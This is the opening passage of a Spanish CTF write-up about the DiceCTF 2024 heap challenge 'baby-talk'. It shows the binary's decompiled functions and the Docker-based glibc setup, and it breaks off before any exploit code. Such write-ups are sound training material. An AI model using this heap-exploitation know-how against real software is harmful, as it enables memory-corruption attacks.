<!doctype html><html lang="es"><head><title>baby-talk | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="DiceCTF 2024 Quals. Binario de 64 bits. Explotación del _heap_. _Null-byte poison_. _Chunks_ solapados. Tcache _poisoning_"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="DiceCTF 2024 Quals. Binario de 64 bits. Explotación del _heap_. _Null-byte poison_. _Chunks_ solapados. Tcache _poisoning_"><meta itemprop="keywords" content><meta itemprop="name" content="baby-talk"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="DiceCTF 2024 Quals. Binario de 64 bits. Explotación del _heap_. _Null-byte poison_. _Chunks_ solapados. Tcache _poisoning_"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="baby-talk"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/other/dicectf/baby-talk/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="DiceCTF 2024 Quals. Binario de 64 bits. Explotación del _heap_. _Null-byte poison_. _Chunks_ solapados. Tcache _poisoning_"><meta name="twitter:description" content="DiceCTF 2024 Quals. Binario de 64 bits. Explotación del _heap_. _Null-byte poison_. _Chunks_ solapados. Tcache _poisoning_"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="baby-talk"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/other/dicectf/baby-talk/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/other/dicectf/baby-talk/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- DICECTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/other/dicectf/baby-talk/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/other/dicectf/baby-talk/&amp;text=baby-talk" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/other/dicectf/baby-talk/&amp;title=baby-talk" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">baby-talk</h1><p class="mb4 f6 dib tracked">17 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-_token_">Función de <em>token</em></a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a><ul><li><a href="#versiones-diferentes">Versiones diferentes</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#_null-byte-poison_"><em>Null-byte poison</em></a></li><li><a href="#tcache-_poisoning_">Tcache <em>poisoning</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
</code></pre></div><p>El programa nos ofrece cuatro opciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>  
1. str
2. tok
3. del
4. exit

&gt;
</code></pre></div><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Si abrimos el binario en Ghidra, veremos el siguiente código en C descompilado. La función <code>main</code> gestiona las opciones y llama a la función correspondiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong option;</span>

<span class="mtk1">  </span><span class="mtk8">setbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">print_menu</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">        option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>  

<span class="mtk1">        </span><span class="mtk8">do_tok</span><span class="mtk1">();</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> option) </span><span class="mtk5">break</span><span class="mtk1">;</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">();</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">LAB_00100c7b:</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"??"</span><span class="mtk1">);</span>
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (option </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">      }</span>

<span class="mtk1">      </span><span class="mtk5">goto</span><span class="mtk1"> LAB_00100c7b;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="función-de-asignación">Función de asignación</h3><p>En <code>do_str</code>, tenemos la capacidad de asignar <em>strings</em> de tamaños hasta <code>0x1000</code> y escribir en ellas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
<span class="mtk1">  ulong size;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_str;</span>
<span class="mtk1">  </span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_empty</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too many!"</span><span class="mtk1">);</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size? "</span><span class="mtk1">);</span>
<span class="mtk1">    size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (size </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">1001</span><span class="mtk1">) {</span>
<span class="mtk1">      p_str </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(size);</span>
<span class="mtk1">      strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index] </span><span class="mtk5">=</span><span class="mtk1"> p_str;</span>

<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"no mem!"</span><span class="mtk1">);</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"str? "</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, strs[(</span><span class="mtk7 mtki">int</span><span class="mtk1">) index], size);</span>
<span class="mtk1">        </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"stored at </span><span class="mtk6">%d</span><span class="mtk4">!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) index);</span>  
<span class="mtk1">      }</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>La <em>string</em> se colocará en una lista global <code>strs</code> de <code>16</code> posiciones. No podemos elegir el índice, pero la función nos dirá dónde está.</p><h3 id="función-de-liberación">Función de liberación</h3><p>En <code>do_del</code>, seleccionamos el índice de la <em>string</em> que queremos eliminar y se libera usando <code>free</code>. Además, la posición también se pone a <code>NULL</code> en <code>strs</code>, por lo que no hay <em>Use After Free</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_del</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong index;</span>

<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"idx? "</span><span class="mtk1">);</span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (strs[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>  
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"empty!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">free</span><span class="mtk1">(strs[index]);</span>
<span class="mtk1">      strs[index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="función-de-_token_">Función de <em>token</em></h3><p>Hay otra función llamada <code>do_tok</code>, que coge un índice de <code>strs</code> y un separador para usar <code>strtok</code> en la <em>string</em> elegida:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">do_tok</span><span class="mtk1">() {</span>
<span class="mtk1">  ulong index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> delim[</span><span class="mtk6">2</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">iter;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_str;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"idx? "</span><span class="mtk1">);</span>
<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_num</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) {</span>
<span class="mtk1">    p_str </span><span class="mtk5">=</span><span class="mtk1"> strs[index];</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (p_str </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"empty!"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"delim? "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, delim, </span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">      delim[</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">      iter </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(p_str, delim);</span>

<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (iter </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(iter);</span>
<span class="mtk1">        iter </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strtok</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, delim);</span>  
<span class="mtk1">      }</span>
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"too big!"</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>El resultado es que todas las subcadenas se imprimirán en diferentes líneas. Si no hay caracteres separadores en la cadena, se imprimirá la misma cadena en sí misma.</p><h2 id="configuración-del-entorno">Configuración del entorno</h2><p>En primer lugar, dado que este es un reto de explotación de <em>heap</em>, necesitamos comprobar la versión de Glibc que estamos tratando de explotar. En este punto, tuve algunos problemas para resolver esto, porque este era el <code>Dockerfile</code> proporcionado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span><span class="mtk1"> pwn.red/</span><span class="mtk8 mtku detected-link">jail</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">--from</span><span class="mtk5">=</span><span class="mtk1">ubuntu@sha256:dca176c9663a7ba4c1f0e710986f5a25e672</span><span class="mtk1">842963d95b960191e2d9f7185ebe</span><span class="mtk1"> </span><span class="mtk9 mtki">/</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv</span>  

<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">flag.txt</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv/app/</span>
<span class="mtk5">COPY</span><span class="mtk1"> </span><span class="mtk9 mtki">chall</span><span class="mtk1"> </span><span class="mtk9 mtki">/srv/app/run</span>
</code></pre></div><p>Entonces, mi enfoque era ejecutar el contenedor y copiar la biblioteca Glibc y el cargador a mi máquina <em>host</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'dice{asdf}'</span> &gt; <span class="mtku">flag.txt</span>

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> build -t baby-talk <span class="mtku">.</span>
...

<span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>"</span>:/opt -it baby-talk sh
/ # cp /lib/ld-linux-x86-64.so.2 /lib/libc.so.6 /opt
/ # exit

<span class="code-cyan">$</span> <span class="code-dark-green">./ld-linux-x86-64.so.2</span> <span class="mtku">./libc.so.6</span>
GNU C Library (Debian GLIBC 2.36-9) stable release version 2.36.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A  
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.2.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&lt;http://www.debian.org/Bugs/&gt;.
</code></pre></div><p>Aquí, parcheé el binario para cargar esta Glibc 2.36 y comencé a resolver el reto hasta que obtuve un <em>exploit</em> que funcionaba. Sin embargo, cuando probé el <em>exploit</em> contra la instancia remota, nunca funcionó&mldr;</p><p>Luego, me confundí un poco y volví al contenedor de Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">docker</span> run -v <span class="code-dark-yellow">"<span class="code-dark-magenta">$(<span class="code-dark-green">pwd</span>)</span>"</span>:/opt -it baby-talk sh
/ # find / -name libc.so.6 2>/dev/null
/srv/lib/x86_64-linux-gnu/libc.so.6
/lib/libc.so.6
/opt/libc.so.6
